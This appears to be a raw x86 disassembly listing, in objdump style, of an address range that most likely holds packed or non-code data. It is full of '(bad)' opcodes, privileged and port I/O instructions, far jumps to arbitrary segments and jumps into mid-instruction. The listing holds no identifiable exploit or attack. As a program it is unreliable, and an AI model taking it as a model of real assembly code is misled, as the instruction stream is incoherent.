  41936f:	and    cl,bh
  419371:	mov    bl,0x2e
  419373:	ins    BYTE PTR es:[edi],dx
  419374:	push   es
  419375:	or     DWORD PTR [edx],eax
  419377:	loop   0x4193a3
  419379:	pop    edx
  41937a:	cmc    
  41937b:	push   cs
  41937c:	sub    DWORD PTR [edi+eiz*8],ecx
  41937f:	dec    esi
  419380:	test   eax,0xb0c7aea0
  419385:	dec    esp
  419386:	or     cl,BYTE PTR ds:0xfe9bd0f4
  41938c:	or     DWORD PTR [edx+0x5390d670],edx
  419392:	xchg   esi,eax
  419393:	push   edi
  419394:	and    al,0xec
  419396:	jno    0x4193f1
  419398:	dec    edi
  419399:	and    bh,dl
  41939b:	jb     0x4193e7
  41939d:	es inc eax
  41939f:	xchg   edx,eax
  4193a0:	stos   BYTE PTR es:[edi],al
  4193a1:	mov    DWORD PTR [esp+0x7bfac93a],edi
  4193a8:	aam    0xa7
  4193aa:	sub    al,0xb0
  4193ac:	adc    ch,BYTE PTR [esi]
  4193ae:	mov    ds:0x110b05df,al
  4193b3:	add    al,0xcf
  4193b5:	inc    dh
  4193b7:	sbb    DWORD PTR ds:[edx-0x37ed4931],ebx
  4193be:	nop
  4193bf:	bound  esp,QWORD PTR [esi+0x49]
  4193c2:	fs xchg edi,eax
  4193c4:	xchg   BYTE PTR [ecx+ecx*8+0x3e5130c2],al
  4193cb:	xor    al,0x1e
  4193cd:	in     al,0x1c
  4193cf:	das    
  4193d0:	in     eax,dx
  4193d1:	jae    0x4193b4
  4193d3:	pop    ecx
  4193d4:	jmp    0x5809:0x62919b76
  4193db:	pop    esp
  4193dc:	jns    0x4193ec
  4193de:	rol    bl,cl
  4193e0:	fs mov edi,0xe348ba77
  4193e6:	sbb    dh,dl
  4193e8:	lahf   
  4193e9:	test   ebp,ebp
  4193eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ec:	and    DWORD PTR [eax],0x903d6b8
  4193f2:	inc    edx
  4193f3:	jne    0x419401
  4193f5:	dec    esi
  4193f6:	cmp    al,0x93
  4193f8:	jns    0x41942f
  4193fa:	mov    DWORD PTR [ecx+0x4d],esi
  4193fd:	das    
  4193fe:	pop    es
  4193ff:	mov    ebx,0x350f04a7
  419404:	xlat   BYTE PTR ds:[ebx]
  419405:	mov    ah,0x82
  419407:	dec    eax
  419408:	lods   al,BYTE PTR ds:[esi]
  419409:	cmp    eax,ebx
  41940b:	je     0x419409
  41940d:	push   0x3e04d359
  419412:	mov    eax,DWORD PTR [ecx+0x5133bd29]
  419418:	jecxz  0x419421
  41941a:	mov    ebx,0x24bba455
  41941f:	lods   al,BYTE PTR ds:[esi]
  419420:	push   ds
  419421:	(bad)  
  419422:	xchg   edi,eax
  419423:	push   esi
  419424:	(bad)  
  419426:	inc    edx
  419427:	xchg   ebp,eax
  419428:	sub    bh,BYTE PTR [eax+eiz*4]
  41942b:	mov    ds:0x5f0dbd27,eax
  419430:	jb     0x419461
  419432:	jle    0x41945e
  419434:	mov    BYTE PTR [si+0x2c],cl
  419438:	mov    dl,0x8b
  41943a:	mov    ebp,eax
  41943c:	rcr    BYTE PTR [esi+0x1f],cl
  41943f:	push   esi
  419440:	cmp    ah,BYTE PTR ds:0x0
	...
  4194b2:	add    BYTE PTR [eax],al
  4194b4:	inc    ecx
  4194b5:	stc    
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	xor    DWORD PTR [edx+ebp*2+0x27],ebx
  4194c4:	mov    dh,0x12
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	test   BYTE PTR [eax],0x0
  4194cb:	add    BYTE PTR [esi+0xe],ah
  4194ce:	out    dx,eax
  4194cf:	and    eax,0x35d0c3ad
  4194d4:	inc    ebx
  4194d5:	xchg   ebp,eax
  4194d6:	pop    ebx
  4194d7:	in     al,dx
  4194d8:	aam    0xee
  4194da:	in     eax,0xf0
  4194dc:	or     eax,0xa075a123
  4194e1:	nop
  4194e2:	enter  0xdeb7,0xf
  4194e6:	bound  ebp,QWORD PTR [eax+0x965d876]
  4194ec:	retf   0x595d
  4194ef:	jp     0x4194a3
  4194f1:	addr16 into 
  4194f3:	gs push ebx
  4194f5:	ror    BYTE PTR [esi-0x1b7c057b],cl
  4194fb:	aam    0xe9
  4194fd:	push   ds
  4194fe:	mov    dh,0x2e
  419500:	aaa    
  419501:	adc    BYTE PTR [ecx],cl
  419503:	gs out dx,al
  419505:	les    esi,FWORD PTR [edx+eax*1+0x3]
  419509:	push   eax
  41950a:	or     dh,bl
  41950c:	adc    esp,ebp
  41950e:	or     ah,bh
  419510:	loop   0x41952e
  419512:	loopne 0x419555
  419514:	lods   eax,DWORD PTR ds:[esi]
  419515:	inc    ecx
  419516:	and    eax,DWORD PTR [edx]
  419518:	xchg   BYTE PTR [ecx],dh
  41951a:	or     DWORD PTR [esi],ebp
  41951c:	xchg   ah,bl
  41951e:	xchg   esi,eax
  41951f:	scas   al,BYTE PTR es:[edi]
  419520:	(bad)  
  419521:	hlt    
  419522:	es leave 
  419524:	daa    
  419525:	jmp    0x33921737
  41952a:	jmp    0x4194dd
  41952c:	outs   dx,BYTE PTR ds:[esi]
  41952d:	add    eax,0xa8b6abe6
  419532:	shl    BYTE PTR [edx-0x77],1
  419535:	push   ds
  419536:	out    0x9c,eax
  419538:	das    
  419539:	adc    ch,bh
  41953b:	call   0x584d:0xb776adbf
  419542:	xor    eax,0x7e28ae12
  419547:	lahf   
  419548:	lea    ebp,[esi+0x55]
  41954b:	(bad)  
  41954c:	pop    ebx
  41954d:	or     eax,0xc8eeded3
  419552:	leave  
  419553:	mov    ds:0xc53b3e17,al
  419558:	adc    BYTE PTR [ebx-0x3913c4d7],bl
  41955e:	fdiv   QWORD PTR [ebp-0x7e]
  419561:	jecxz  0x4195d2
  419563:	add    eax,0x81b16420
  419568:	inc    eax
  419569:	adc    dh,cl
  41956b:	or     bl,BYTE PTR [edi+0x61de09e]
  419571:	retf   
  419572:	jae    0x4195ab
  419574:	sbb    eax,0x7f823ad7
  419579:	sti    
  41957a:	cmp    al,BYTE PTR [ebx]
  41957c:	jo     0x419541
  41957e:	jne    0x41959b
  419580:	sti    
  419581:	xor    esp,DWORD PTR [edi-0x28]
  419584:	hlt    
  419585:	test   eax,0x8ab43693
  41958a:	je     0x41953d
  41958c:	nop
  41958d:	inc    esi
  41958e:	int3   
  41958f:	mov    edi,0xd32e9c92
  419594:	push   0xffffffd7
  419596:	call   DWORD PTR [ebp-0x4aef2743]
  41959c:	scas   al,BYTE PTR es:[edi]
  41959d:	test   al,0x54
  41959f:	call   0xc08a:0xc875752d
  4195a6:	mov    es,WORD PTR [ebp+0x4f]
  4195a9:	mov    eax,0x26563914
  4195ae:	loop   0x419562
  4195b0:	dec    eax
  4195b1:	xchg   ecx,eax
  4195b2:	shl    DWORD PTR [eax],cl
  4195b4:	mov    edi,0x5eb21300
  4195b9:	mov    ss,WORD PTR [eax+0x48dfc7b0]
  4195bf:	call   0x0:0x9e08
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0x1bb9230f]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [ebp+edx*1+0x36],ch
  41964f:	mov    cr2,edx
  419652:	stos   DWORD PTR es:[edi],eax
  419653:	push   edx
  419654:	clc    
  419655:	jae    0x419684
  419657:	push   ss
  419658:	push   ebp
  419659:	inc    ecx
  41965a:	cmp    al,0xbf
  41965c:	xchg   edi,eax
  41965d:	(bad)
  419661:	or     al,0x86
  419663:	hlt    
  419664:	jmp    0x4d1f:0x3f3e5506
  41966b:	test   ebx,ebx
  41966d:	(bad)  
  41966e:	(bad)  
  419671:	push   0x1a5a6f16
  419676:	cmp    al,0x32
  419678:	xor    eax,0x27
  41967b:	jg     0x4196f3
  41967d:	adc    DWORD PTR [ecx-0x7d],0x8570910b
  419684:	pushf  
  419685:	cs ins BYTE PTR es:[edi],dx
  419687:	imul   esi,DWORD PTR [ecx-0x3a],0xf2b9de61
  41968e:	(bad)  
  41968f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419690:	int3   
  419691:	loope  0x41962e
  419693:	pop    ebp
  419694:	loope  0x419635
  419696:	add    eax,0x7e64ca3c
  41969b:	rol    DWORD PTR [edx-0x11],0xb8
  41969f:	push   eax
  4196a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196a1:	(bad)  
  4196a2:	dec    BYTE PTR [ebp+0x2e]
  4196a5:	sub    al,0xb5
  4196a7:	lods   eax,DWORD PTR ds:[esi]
  4196a8:	test   eax,0xcd30b052
  4196ad:	test   edx,0x77c37507
  4196b3:	loopne 0x4196b1
  4196b5:	sti    
  4196b6:	adc    eax,0x91325a82
  4196bb:	cmp    esi,edx
  4196bd:	ror    DWORD PTR [edx+0x17aa86e4],0x43
  4196c4:	aas    
  4196c5:	dec    eax
  4196c6:	ins    DWORD PTR es:[edi],dx
  4196c7:	pop    edx
  4196c8:	cmp    ch,bl
  4196ca:	sbb    eax,0xa507da87
  4196cf:	inc    eax
  4196d0:	jecxz  0x419728
  4196d2:	repnz sub al,0xbb
  4196d5:	cmc    
  4196d6:	in     al,0xcd
  4196d8:	dec    esp
  4196d9:	inc    eax
  4196da:	es mov edx,0x180f7d61
  4196e0:	fsubr  st(5),st
  4196e2:	jg     0x419706
  4196e4:	int3   
  4196e5:	mov    ds:0xcdf2e99c,al
  4196ea:	jg     0x419757
  4196ec:	pop    ebp
  4196ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196ee:	xchg   ch,al
  4196f0:	xchg   ebp,eax
  4196f1:	adc    al,0x32
  4196f3:	cmp    BYTE PTR [ebx-0x38],0xfc
  4196f7:	push   0xfb322161
  4196fc:	cmp    DWORD PTR [eax-0x3c8a0ba9],ebp
  419702:	jne    0x419716
  419704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419705:	cmp    ebp,DWORD PTR [esi-0x6d]
  419708:	in     al,dx
  419709:	je     0x419719
  41970b:	mov    gs:0xf92a36de,eax
  419711:	mov    eax,ds:0x5263a88c
  419716:	adc    BYTE PTR [ebp+eiz*1-0x107464fd],ah
  41971d:	sub    eax,0x997d0c3f
  419722:	pop    edx
  419723:	loopne 0x419762
  419725:	or     BYTE PTR [eax+0x10],al
  419728:	sbb    dh,BYTE PTR gs:[edx]
  41972b:	xchg   edi,eax
  41972c:	es dec ebx
  41972e:	ins    DWORD PTR es:[edi],dx
  41972f:	idiv   DWORD PTR [ecx]
  419731:	scas   eax,DWORD PTR es:[edi]
  419732:	in     eax,dx
  419733:	cmp    eax,0x89eec006
  419738:	(bad)  [eax]
  41973a:	mov    bl,0xc6
  41973c:	jnp    0x41979e
  41973e:	aad    0x67
  419740:	dec    edx
  419741:	add    BYTE PTR ss:[eax],al
	...
  4197b4:	xchg   esp,eax
  4197b5:	enter  0x4337,0x7f
  4197b9:	push   esp
  4197bb:	fist   WORD PTR [ecx-0x5fd83417]
  4197c1:	imul   esi,DWORD PTR [esi+0x71],0xffffffa2
  4197c5:	adc    al,0x1
  4197c7:	add    dh,dh
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [ebx],bh
  4197cd:	jge    0x419775
  4197cf:	aam    0x3c
  4197d1:	xor    dh,ah
  4197d3:	sar    DWORD PTR [ecx+0x5d],0x20
  4197d7:	nop
  4197d8:	imul   ebx,DWORD PTR [edi],0xdd180e6f
  4197de:	mov    WORD PTR [eax+0x73],es
  4197e1:	or     DWORD PTR [ebx+ecx*4],edi
  4197e4:	mov    dh,0xbd
  4197e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197e7:	popa   
  4197e8:	aam    0xe
  4197ea:	adc    ebp,ebp
  4197ec:	sub    eax,0x5de3efb7
  4197f1:	cmp    al,BYTE PTR [edx-0x10]
  4197f4:	pop    edi
  4197f5:	dec    ebp
  4197f6:	or     al,0xa0
  4197f8:	cmp    eax,DWORD PTR [ebx]
  4197fa:	dec    ebp
  4197fb:	mov    ebx,0xe3712764
  419800:	and    DWORD PTR ds:0x82b10b1a,ebx
  419806:	out    0xa4,eax
  419808:	inc    esp
  419809:	ret    0xac3a
  41980c:	sub    DWORD PTR ds:[ebp-0x1d],0xac8a938e
  419814:	stc    
  419815:	fnstenv [edi+0x52]
  419818:	push   esp
  419819:	lods   al,BYTE PTR ds:[esi]
  41981a:	stc    
  41981b:	add    bh,BYTE PTR [edx]
  41981d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41981e:	push   ecx
  41981f:	add    al,0xa6
  419821:	inc    edx
  419822:	ins    BYTE PTR es:[edi],dx
  419823:	mov    dl,0xa2
  419825:	ja     0x41985e
  419827:	inc    esi
  419828:	add    al,0x7f
  41982a:	rol    DWORD PTR [edi+edi*8-0x8267d6e],cl
  419831:	dec    esi
  419832:	jnp    0x4197ee
  419834:	sub    DWORD PTR [ecx-0x72],eax
  419837:	jns    0x4197ca
  419839:	pop    edi
  41983a:	into   
  41983b:	lea    esi,[edx]
  41983d:	pop    ds
  41983e:	dec    esp
  41983f:	dec    edi
  419840:	mov    ebx,0x61062d73
  419845:	xor    DWORD PTR [eax+0x4d869a84],ebx
  41984b:	les    esi,FWORD PTR [esi-0x23]
  41984e:	scas   al,BYTE PTR es:[edi]
  41984f:	leave  
  419850:	jb     0x4198a4
  419852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419853:	stc    
  419854:	sahf   
  419855:	mov    esp,0xf4a3c93a
  41985a:	enter  0xc48,0xe0
  41985e:	stc    
  41985f:	cwde   
  419860:	push   ebp
  419861:	fidiv  WORD PTR [eax+0x40]
  419864:	add    ah,bh
  419866:	stc    
  419867:	mov    esi,0xc5d492d2
  41986c:	test   al,0x2b
  41986e:	iret   
  41986f:	loope  0x4198db
  419871:	adc    eax,0x1e5920ec
  419876:	ins    DWORD PTR es:[edi],dx
  419877:	clc    
  419878:	scas   al,BYTE PTR es:[edi]
  419879:	fist   WORD PTR [ecx-0x481ac3ec]
  41987f:	nop
  419880:	mov    ss,WORD PTR [ebx-0x6fef46dc]
  419886:	loope  0x4198e3
  419888:	fidivr DWORD PTR [eax+0x54249519]
  41988e:	mov    BYTE PTR [edx+0x505f3f75],bl
  419894:	out    dx,eax
  419895:	inc    edx
  419896:	jle    0x4198ac
  419898:	sub    al,0x20
  41989a:	lahf   
  41989b:	sbb    al,BYTE PTR [edi]
  41989d:	frstor [ebx]
  41989f:	pusha  
  4198a0:	pop    ds
  4198a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198a2:	dec    edx
  4198a3:	mov    edi,0x7db36d97
  4198a8:	mov    ch,0xa6
  4198aa:	(bad)  
  4198ab:	(bad)  
  4198ac:	fimul  DWORD PTR [edx]
  4198ae:	xchg   ecx,eax
  4198af:	mov    bh,0x9d
  4198b1:	xchg   edi,eax
  4198b2:	jmp    0x4198a7
  4198b4:	hlt    
  4198b5:	clc    
  4198b6:	xchg   cl,al
  4198b8:	jmp    0x2c9dc2c4
  4198bd:	sub    eax,0x72b4ea9d
	...
  419932:	add    BYTE PTR [eax],al
  419934:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	(bad)  [ebx]
  419942:	or     ebp,DWORD PTR [esi-0x68]
  419945:	adc    eax,0xf60001
  41994a:	add    BYTE PTR [eax],al
  41994c:	sbb    al,0xf
  41994e:	inc    eax
  41994f:	inc    edx
  419950:	push   ss
  419951:	inc    edx
  419952:	addr16 into 
  419954:	push   0x33c4eadf
  419959:	jbe    0x41991d
  41995b:	xchg   ebx,eax
  41995c:	and    BYTE PTR [esi-0x13d83136],0xaa
  419963:	inc    edx
  419964:	mov    edi,0xed53f2b7
  419969:	inc    ebx
  41996a:	cwde   
  41996b:	mov    ebp,0x16c4a3ff
  419970:	pop    edx
  419971:	inc    esp
  419972:	hlt    
  419973:	cli    
  419974:	sbb    al,0xef
  419976:	(bad)  
  419977:	(bad)  
  419979:	mov    DWORD PTR [edx-0x1c],eax
  41997c:	cmp    eax,DWORD PTR [edi-0x5f]
  41997f:	icebp  
  419980:	les    edi,FWORD PTR ds:0x95396ba5
  419986:	adc    eax,0x5502def2
  41998b:	fld    TBYTE PTR [edx+edi*8]
  41998e:	out    0x6b,eax
  419990:	cs mov bl,0x68
  419993:	jmp    0x419991
  419995:	mov    ah,0x3b
  419997:	xor    dh,al
  419999:	cmp    al,0x15
  41999b:	cmp    dl,BYTE PTR [ebx]
  41999d:	ins    BYTE PTR es:[edi],dx
  41999e:	(bad)  
  41999f:	retf   
  4199a0:	or     al,dh
  4199a2:	mov    dl,0x1b
  4199a4:	lods   al,BYTE PTR ds:[esi]
  4199a5:	mov    ch,0x63
  4199a7:	div    DWORD PTR cs:[ebp+0x31]
  4199ab:	inc    eax
  4199ac:	adc    edi,esi
  4199ae:	cmp    DWORD PTR [eax+0x5b6bde9f],esp
  4199b4:	sub    bl,bh
  4199b6:	data16 sbb cl,BYTE PTR [eax]
  4199b9:	je     0x4199fa
  4199bb:	pop    ebx
  4199bc:	push   ebp
  4199bd:	retf   0x7c2f
  4199c0:	mov    al,0xa6
  4199c2:	jge    0x4199aa
  4199c4:	xor    bh,BYTE PTR [eax+ebp*8+0x79e872b5]
  4199cb:	mov    BYTE PTR ds:[esi-0x59dc6858],bh
  4199d2:	daa    
  4199d3:	inc    ecx
  4199d4:	enter  0x2309,0x47
  4199d8:	add    ch,bl
  4199da:	mov    al,ds:0x1bb95cbb
  4199df:	or     BYTE PTR [ebx],cl
  4199e1:	mov    dl,0xd2
  4199e3:	outs   dx,BYTE PTR ds:[esi]
  4199e4:	inc    edx
  4199e5:	(bad)  
  4199e6:	test   al,0x79
  4199e8:	jecxz  0x4199b7
  4199ea:	aam    0xe5
  4199ec:	shr    DWORD PTR [ecx-0x30],cl
  4199ef:	or     eax,0xec93a44c
  4199f4:	xchg   edi,ebp
  4199f6:	in     eax,0x69
  4199f8:	inc    esp
  4199f9:	push   ds
  4199fa:	jecxz  0x4199a9
  4199fc:	fwait
  4199fd:	dec    edi
  4199fe:	call   0xbd6dc139
  419a03:	repnz or eax,DWORD PTR [ebx]
  419a06:	cmp    DWORD PTR [eax],esp
  419a08:	jmp    0x419a54
  419a0a:	loope  0x4199e9
  419a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a0d:	sbb    BYTE PTR [ebx-0x6e],bh
  419a10:	sub    DWORD PTR [eax+edi*2-0x23e102c0],eax
  419a17:	in     al,0x6c
  419a19:	leave  
  419a1a:	sahf   
  419a1b:	xchg   ebx,ebx
  419a1d:	fbld   TBYTE PTR [ebp+0x6a]
  419a20:	cld    
  419a21:	dec    edi
  419a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a23:	xor    bl,BYTE PTR [esp-0x69]
  419a27:	test   BYTE PTR [eax],ah
  419a29:	data16 xrelease xchg BYTE PTR [ecx-0x68bbd917],cl
  419a31:	sbb    al,BYTE PTR [ebx-0x2]
  419a34:	outs   dx,BYTE PTR ds:[esi]
  419a35:	retf   
  419a36:	nop
  419a37:	loope  0x4199bd
  419a39:	and    BYTE PTR [eax+ecx*8-0x1d31aae6],0xa5
  419a41:	repnz add BYTE PTR [eax],al
	...
  419ab4:	jl     0x419ac9
  419ab6:	test   DWORD PTR [edx],esi
  419ab8:	out    dx,eax
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0xf7357b47
  419ac1:	sub    eax,0x168e7588
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	test   BYTE PTR [eax],0x0
  419acb:	add    BYTE PTR [eax-0x26373cff],cl
  419ad1:	push   esp
  419ad2:	xchg   ebp,eax
  419ad3:	sub    bh,BYTE PTR ds:0x9e8b87ab
  419ad9:	sub    eax,0x90f81b9a
  419ade:	xor    eax,0x1fec959b
  419ae3:	mov    eax,ds:0xfa190855
  419ae8:	dec    edx
  419ae9:	pushf  
  419aea:	push   ebp
  419aeb:	push   esi
  419aec:	lea    eax,[bx+si-0x3]
  419af0:	inc    ebp
  419af1:	test   DWORD PTR [ecx-0x77432c79],esi
  419af7:	pop    ecx
  419af8:	push   ss
  419af9:	jne    0x419aca
  419afb:	idiv   ebx
  419afd:	xchg   ecx,eax
  419afe:	fbstp  TBYTE PTR [edx-0x735443ae]
  419b04:	jmp    0x9dfe:0xd215771d
  419b0b:	cmp    al,0x42
  419b0d:	je     0x419aa4
  419b0f:	mov    dl,ch
  419b11:	sbb    esp,DWORD PTR [ebp-0x67]
  419b14:	xor    eax,0x95413392
  419b19:	clts   
  419b1b:	not    BYTE PTR [ecx]
  419b1d:	fisubr DWORD PTR ds:0xb5d6a752
  419b23:	xchg   ebx,eax
  419b24:	aas    
  419b25:	inc    eax
  419b26:	mov    dl,0x16
  419b28:	mov    al,ds:0x560adbf1
  419b2d:	add    ebx,DWORD PTR [edi-0x38]
  419b30:	bnd jg 0x419b56
  419b33:	push   cs
  419b34:	popa   
  419b35:	lock and eax,ecx
  419b38:	int    0xfd
  419b3a:	ret    0xd62c
  419b3d:	push   eax
  419b3e:	and    ah,BYTE PTR ds:0x7ae2a267
  419b44:	ret    
  419b45:	ja     0x419b3f
  419b47:	jbe    0x419b98
  419b49:	xor    ah,ah
  419b4b:	pop    eax
  419b4c:	xchg   esp,eax
  419b4d:	je     0x419b8e
  419b4f:	sbb    ecx,esp
  419b51:	iret   
  419b52:	add    DWORD PTR [ebx],esp
  419b54:	jg     0x419b20
  419b56:	xchg   edi,eax
  419b57:	popa   
  419b58:	iret   
  419b59:	inc    ebx
  419b5a:	pop    ds
  419b5b:	mov    ebx,0x3cca8eb8
  419b60:	fistp  WORD PTR [ebx]
  419b62:	inc    ebp
  419b63:	pop    es
  419b64:	add    ah,cl
  419b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b67:	loop   0x419b74
  419b69:	test   DWORD PTR [ebx-0x61],esi
  419b6c:	enter  0xae2,0xd6
  419b70:	fwait
  419b71:	jcxz   0x419bef
  419b74:	pmullw mm5,QWORD PTR [eax+0x6c]
  419b78:	add    BYTE PTR [ecx+edi*1+0x557a5c01],cl
  419b7f:	das    
  419b80:	not    DWORD PTR [ebx-0x4c3a5a9]
  419b86:	and    dl,dh
  419b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b89:	mov    ebp,0xb4f46678
  419b8e:	int    0xed
  419b90:	imul   esp,DWORD PTR [edx-0x5b],0x72
  419b94:	adc    al,0x82
  419b96:	add    ebx,DWORD PTR [ecx+0x1c]
  419b99:	xor    eax,0x32fe586d
  419b9e:	xchg   ebp,eax
  419b9f:	push   ebp
  419ba0:	jl     0x419c1e
  419ba2:	cld    
  419ba3:	js     0x419c1e
  419ba5:	out    dx,eax
  419ba6:	sub    dl,BYTE PTR [esi-0x3d]
  419ba9:	aad    0xed
  419bab:	xlat   BYTE PTR ds:[ebx]
  419bac:	or     eax,0xcd6d7009
  419bb1:	gs jae 0x419c1f
  419bb4:	imul   edx,DWORD PTR [ebx+0x7ce8d788],0x43
  419bbb:	cmp    eax,0xe5425af2
  419bc0:	xchg   edx,eax
  419bc1:	sbb    al,0x0
	...
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0x1
  419c41:	mov    bh,0xc2
  419c43:	outs   dx,DWORD PTR ds:[esi]
  419c44:	test   BYTE PTR [edi],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	test   BYTE PTR [eax],0x0
  419c4b:	add    dl,bh
  419c4d:	test   DWORD PTR [edx-0x77314a03],edi
  419c53:	push   ds
  419c54:	sar    ah,1
  419c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c57:	ja     0x419cd7
  419c59:	repz mov edi,0xb40e1458
  419c5f:	scas   al,BYTE PTR es:[edi]
  419c60:	adc    ebx,DWORD PTR [edi]
  419c62:	stos   DWORD PTR es:[edi],eax
  419c63:	lods   eax,DWORD PTR ds:[esi]
  419c64:	test   dh,bh
  419c66:	jp     0x419cc0
  419c68:	imul   eax,DWORD PTR [edx+edx*2],0xffffffe6
  419c6c:	popf   
  419c6d:	push   edi
  419c6e:	push   esp
  419c6f:	fld    TBYTE PTR [edx]
  419c71:	fist   DWORD PTR [eax+0x55a1490b]
  419c77:	dec    ebx
  419c78:	sti    
  419c79:	jle    0x419c71
  419c7b:	stc    
  419c7c:	or     DWORD PTR [ecx],ecx
  419c7e:	mov    bh,0x76
  419c80:	mov    esp,0xb9a90dc1
  419c85:	shl    cl,0x2a
  419c88:	jae    0x419cf2
  419c8a:	fwait
  419c8b:	dec    esi
  419c8c:	cmp    eax,0x48a19f5
  419c91:	mov    dh,0xbe
  419c93:	mov    ah,BYTE PTR ds:0xa967483d
  419c99:	arpl   WORD PTR [ebx+eiz*8+0x6f],sp
  419c9d:	les    ecx,FWORD PTR [edi-0x23]
  419ca0:	pusha  
  419ca1:	mov    al,ds:0x5df5b9a3
  419ca6:	icebp  
  419ca7:	pop    ss
  419ca8:	or     DWORD PTR [edx-0x44],ebx
  419cab:	fs hlt 
  419cad:	lds    esp,FWORD PTR [eax]
  419caf:	jnp    0x419ca5
  419cb1:	std    
  419cb2:	imul   ecx,DWORD PTR [edx+0x39302e3e],0xa5aa48f9
  419cbc:	dec    edx
  419cbd:	test   eax,0x1365a82f
  419cc2:	retf   
  419cc3:	dec    ebx
  419cc4:	outs   dx,DWORD PTR ds:[esi]
  419cc5:	(bad)  
  419cc7:	sar    BYTE PTR [edx-0x80],1
  419cca:	xchg   BYTE PTR [esi+ecx*4+0x12a9b95],cl
  419cd1:	je     0x419ce6
  419cd3:	dec    eax
  419cd4:	fsub   DWORD PTR [esi]
  419cd6:	sbb    al,0xcc
  419cd8:	inc    ecx
  419cd9:	test   eax,0xc06b72e7
  419cde:	out    0xa6,eax
  419ce0:	data16 adc al,0x83
  419ce3:	cld    
  419ce4:	jecxz  0x419c9d
  419ce6:	fistp  QWORD PTR [ecx]
  419ce8:	outs   dx,BYTE PTR ds:[esi]
  419ce9:	xor    BYTE PTR [edx-0x25401890],al
  419cef:	cmp    edi,DWORD PTR [edi]
  419cf1:	ficom  DWORD PTR [edx]
  419cf3:	cmp    BYTE PTR [ebp+0x47ad6bf6],0xb0
  419cfa:	mov    ebp,0x9de61db8
  419cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d00:	das    
  419d01:	jb     0x419caf
  419d03:	sbb    dh,BYTE PTR [edi+0x14beeaa]
  419d09:	aas    
  419d0a:	pusha  
  419d0b:	and    al,0x2
  419d0d:	mov    WORD PTR [esp+esi*4+0x5f],fs
  419d11:	(bad)  
  419d12:	aas    
  419d13:	lahf   
  419d14:	xchg   ebp,eax
  419d15:	dec    edi
  419d16:	and    BYTE PTR [esi-0x4cd0e70b],dh
  419d1c:	popf   
  419d1d:	ins    DWORD PTR es:[edi],dx
  419d1e:	mov    dl,0xb4
  419d20:	or     ch,BYTE PTR [eax-0x12]
  419d23:	in     al,0xfd
  419d25:	sbb    al,0x52
  419d27:	clc    
  419d28:	jge    0x419ccd
  419d2a:	xchg   ebp,eax
  419d2b:	jge    0x419cfe
  419d2d:	scas   al,BYTE PTR es:[edi]
  419d2e:	hlt    
  419d2f:	imul   esp,DWORD PTR [edi],0xd9eb0cc2
  419d35:	out    dx,eax
  419d36:	jns    0x419ce7
  419d38:	or     ecx,DWORD PTR [eax+ebx*2-0x39]
  419d3c:	push   esp
  419d3d:	add    esp,DWORD PTR ds:0x5dc37e
	...
  419db3:	add    BYTE PTR [esi],cl
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	stc    
  419dc1:	fadd   st(6),st
  419dc3:	mov    esi,0x1187a
  419dc8:	test   BYTE PTR [eax],0x0
  419dcb:	add    BYTE PTR [edx-0x79273dd0],dh
  419dd1:	sub    DWORD PTR [ebp+0x5304d63a],ebp
  419dd7:	fld    TBYTE PTR [eax]
  419dd9:	call   0xd888:0xf86738e3
  419de0:	sub    edx,edx
  419de2:	cs jns 0x419d91
  419de5:	(bad)  
  419de6:	cli    
  419de7:	aaa    
  419de8:	mov    ecx,0x9f39bb71
  419ded:	aas    
  419dee:	sub    dl,0x42
  419df1:	push   edx
  419df2:	lahf   
  419df3:	sbb    al,0xb7
  419df5:	mov    dh,0x6d
  419df7:	push   edx
  419df8:	mov    ah,0xd3
  419dfa:	cmp    cl,ah
  419dfc:	mov    cl,0xe7
  419dfe:	sti    
  419dff:	cld    
  419e00:	xchg   ecx,ecx
  419e02:	inc    edi
  419e03:	mov    ah,0xc4
  419e05:	pushf  
  419e06:	pop    es
  419e07:	pop    edx
  419e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e09:	scas   eax,DWORD PTR es:[edi]
  419e0a:	mov    al,0xfb
  419e0c:	pop    ax
  419e0e:	cmc    
  419e0f:	mov    al,BYTE PTR [ebx-0x64]
  419e12:	mov    ebx,0x5d0729d3
  419e17:	cmp    DWORD PTR [edx],esi
